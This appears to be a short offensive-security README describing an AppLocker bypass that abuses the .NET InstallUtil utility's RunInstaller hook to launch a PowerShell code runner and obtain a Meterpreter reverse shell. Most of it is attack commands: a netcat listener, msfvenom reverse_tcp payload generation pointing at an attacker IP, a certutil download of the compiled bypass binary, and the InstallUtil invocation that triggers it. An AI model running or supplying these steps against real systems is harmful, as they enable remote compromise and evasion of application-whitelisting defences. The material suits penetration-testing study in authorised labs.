# Reverse Shell AppLocker Bypass with Powershell code runner
A .NET installation utility used for registering .NET assemblies can be used and reference the RunInstaller component to trigger the malicious payload that is not found in the 'main' call. 

Compile the csharp binary in Visual Studio and transfer to victim host with certutil. 

## Requirements: 
The following powershell code runner is required and hosted on kali webserver (python http.server)
Reference: CodeRunners/powershellCodeRunner-32.ps1
Reference: CodeRunners/powershellCodeRunner-64.ps1

```bash
# setup netcat listener
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8080

# payload for the powershellCodeRunner 32-bit
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.165 LPORT=8080 EXITFUNC=thread -f ps1
# payload for the powershellCodeRunner 64-bit
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.165 LPORT=8080 EXITFUNC=thread -f ps1

# Download file via certutil -urlcache -f http://ip/CLMBypass.exe clmbypass.exe
PS > C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U clmbypass.exe
```
